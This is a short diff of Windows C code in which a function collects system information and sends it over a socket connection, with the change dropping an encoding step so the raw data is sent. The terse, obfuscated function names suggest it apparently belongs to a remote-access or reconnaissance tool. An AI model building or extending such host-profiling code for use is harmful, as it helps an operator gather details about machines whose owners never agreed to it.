@@ -96,9 +96,10 @@ char* strSysrch(){
 
 int strtAll(SOCKET conn){
    char *SysInfo = strSysrch();
-   char *cdedSys = dcdeStm(SysInfo);
+   //char *cdedSys = dcdeStm(SysInfo);
 
-   send(conn, cdedSys, strlen(cdedSys), 0);
+   send(conn, SysInfo, strlen(SysInfo), 0);
+   free(SysInfo);
    Sleep(300);
    return 0;
 }
